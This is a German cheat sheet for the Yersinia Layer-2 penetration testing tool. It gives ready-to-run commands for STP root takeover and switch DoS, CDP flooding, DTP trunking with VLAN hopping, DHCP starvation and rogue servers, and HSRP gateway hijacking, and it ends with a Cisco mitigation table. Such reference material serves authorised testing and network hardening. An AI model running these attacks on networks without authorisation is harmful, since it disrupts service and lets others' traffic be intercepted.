<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Yersinia-Spickzettel

[Yersinia](https://github.com/tomac/yersinia) ist ein leistungsstarkes Layer-2-Netzwerkpenetrationstest-Framework (Datenverbindungsschicht), das entwickelt wurde, um Schwachstellen in Layer-2-Protokollen wie STP (Spanning Tree Protocol), CDP (Cisco Discovery Protocol), DTP (Dynamic Trunking Protocol), DHCP, HSRP und 802.1Q VLAN-Trunking zu analysieren und auszunutzen.

---

## Inhaltsverzeichnis

- [Unterstützte Protokolle und Modi](#supported-protocols--modes)
- [Installation](#installation)
- [Interaktiver Curses-Modus (`-I`)](#interactive-curses-mode--i)
- [Spanning Tree Protocol (STP)-Angriffe](#spanning-tree-protocol-stp-attacks)
- [Cisco Discovery Protocol (CDP)-Angriffe](#cisco-discovery-protocol-cdp-attacks)
- [Dynamisches Trunking-Protokoll (DTP) und VLAN-Hopping](#dynamic-trunking-protocol-dtp--vlan-hopping)
- [DHCP Rogue & Starvation Attacks](#dhcp-rogue--starvation-attacks)
- [HSRP- und VRRP-Hijacking](#hsrp--vrrp-hijacking)
- [Mitigation & Hardening](#mitigation--hardening)

---

## Unterstützte Protokolle und Modi

Yersinia zielt auf Protokolle ab, die unter IP betrieben werden:
- **STP:** Spanning Tree Protocol (Übernahme der Root-Bridge-Rolle, Benachrichtigungen über Topologieänderungen).
- **CDP:** Cisco Discovery Protocol (Device Flooding, Fake Neighbor Injection).
- **DTP:** Dynamic Trunking Protocol (Aushandlung von Trunk-Links für den Zugriff auf alle VLANs).
- **DHCP:** Dynamic Host Configuration Protocol (Starvation- und Rogue-DHCP-Server).
- **HSRP:** Hot Standby Router Protocol (Aktive Gateway-Übernahme).
- **802.1Q / 802.1X:** Dot1Q VLAN-Hopping und EAPOL-Erschöpfung.
- **VTP:** VLAN Trunking Protocol (Löschen/Überschreiben der VLAN-Datenbank).

Ausführungsmodi:
- **`-I` (Interaktive Flüche):** Vollbild-Terminal-Benutzeroberfläche zum Auswählen von Protokollen, Konfigurieren von Angriffen und Überwachen von Live-Paketen.
- **Nicht interaktive CLI:** Direkte Ausführung für automatisierte Skripte.

---

## Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y yersinia

# Arch Linux / BlackArch
sudo pacman -S yersinia

# Run in terminal
yersinia -h
```
---

## Interaktiver Fluchmodus (`-I`)

Der praktischste und sicherste Weg, Yersinia im Terminal ohne GUI zu nutzen:
```bash
sudo yersinia -I
```
- **`h`**: Hilfe und Tastenkombinationen anzeigen.
- **`g`**: Protokolle wechseln (STP, CDP, DTP, DHCP, HSRP usw.).
- **`x`**: Angriffsmenü für das aktuelle Protokoll ausführen.
- **`c`**: Laufenden Angriff abbrechen.
- **`l`**: Paketprotokollierung umschalten.
- **`q`**: Verlasse Yersinia.

---

## Spanning Tree Protocol (STP)-Angriffe

STP wählt eine Root-Bridge mit der niedrigsten Bridge-ID (Priorität + MAC). Yersinia kann gefälschte BPDUs (Bridge Protocol Data Units) einschleusen, um den Root-Status zu beanspruchen und den Datenverkehr über den Host des Angreifers umzuleiten.

### 1. Root-Rolle beanspruchen (BPDU-Injection)
Senden Sie BPDUs mit der Priorität `0` und einer niedrigeren MAC-Adresse, um zur STP-Root-Bridge zu werden:
```bash
sudo yersinia stp -attack 1 -i eth0
```
### 2. Root-Rolle mit Topologieänderung (TCN) beanspruchen
Zwingen Sie alle Switches, CAM-Tabellen zu leeren und durch den Angreifer wieder zusammenzuführen:
```bash
sudo yersinia stp -attack 2 -i eth0
```
### 3. STP-DoS-Angriff (Flood Config BPDUs)
Absturz oder Überlastung der Switch-CPU mit massiven widersprüchlichen BPDU-Frames:
```bash
sudo yersinia stp -attack 0 -i eth0
```
---

## Cisco Discovery Protocol (CDP)-Angriffe

CDP teilt Gerätenamen, Modelle, Funktionen und Softwareversionen ohne Authentifizierung auf allen Cisco-Geräten.

### 1. Fake-CDP-Nachbarn überfluten
Erschöpfen Sie den Schalterspeicher und erstellen Sie Phantomgeräte in `show cdp neighbors`:
```bash
sudo yersinia cdp -attack 0 -i eth0
```
### 2. Erfassen und prüfen Sie legitime CDP-Pakete
Führen Sie den interaktiven Curses-Modus (`yersinia -I`) aus, drücken Sie `g`, wählen Sie `CDP` aus und beobachten Sie den Switch-Hostnamen, die Verwaltungs-IP, das Hardwaremodell und die native VLAN-ID.

---

## Dynamic Trunking Protocol (DTP) und VLAN-Hopping

DTP handelt Trunking-Links automatisch aus, wenn Switch-Ports im `dynamic desirable`- oder `dynamic auto`-Modus konfiguriert sind.

### 1. Trunking-Link aushandeln (DTP Desirable Packet)
Bringen Sie den Switch-Port dazu, sich in einen 802.1Q-Trunk zu verwandeln:
```bash
sudo yersinia dtp -attack 0 -i eth0
```
Sobald der Trunk ausgehandelt ist, erfassen Sie Frames von allen VLANs oder markieren Sie Pakete mithilfe von Linux 802.1Q-Schnittstellen in isolierten Subnetzen:
```bash
# Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```
---

## DHCP-Rogue- und Hungerangriffe

### 1. DHCP-Starvation-Angriff (IP-Pool erschöpfen)
Senden Sie Tausende von DHCP DISCOVER-Anfragen mit zufälligen MAC-Adressen, um alle verfügbaren IP-Adressen im Pool zu nutzen:
```bash
sudo yersinia dhcp -attack 1 -i eth0
```
### 2. Richten Sie einen Rogue-DHCP-Server ein
Stellen Sie einen nicht autorisierten DHCP-Server mit benutzerdefiniertem DNS und Gateway bereit:
```bash
sudo yersinia dhcp -attack 2 -i eth0
```
---

## HSRP- und VRRP-Hijacking

Mit HSRP können mehrere Router ein einziges virtuelles Standard-Gateway darstellen.

### 1. Beanspruchen Sie die Priorität des aktiven Routers
Injizieren Sie HSRP-HELLO-Pakete mit der Priorität 255, um die Standard-Gateway-IP zu übernehmen:
```bash
sudo yersinia hsrp -attack 0 -i eth0
```
---

## Abmilderung und Verhärtung

| Protokoll | Angriffsvektor | Cisco / Standard-Mitigation |
|---|---|---|
| **STP** | Fake-Root-Bridge-Injektion | `spanning-tree bpduguard enable` auf Zugangsports; `spanning-tree rootguard` auf Inter-Switch-Links. |
| **DTP** | Rogue Trunk-Verhandlung | `switchport mode access` und `switchport nonegotiate` an allen benutzerseitigen Zugriffsports. |
| **CDP** | Überschwemmung / Offenlegung von Informationen | `no cdp run` (global) oder `no cdp enable` auf nicht vertrauenswürdigen Schnittstellenports. |
| **DHCP** | Starvation & Rogue Server | Aktivieren Sie `ip dhcp snooping`, begrenzen Sie die Rate pro Port und konfigurieren Sie vertrauenswürdige Uplink-Ports. |
| **HSRP** | Priority Hijacking | Konfigurieren Sie die MD5-Authentifizierung mit geheimen Schlüsseln (`standby 1 authentication md5 key-string <SECRET>`). |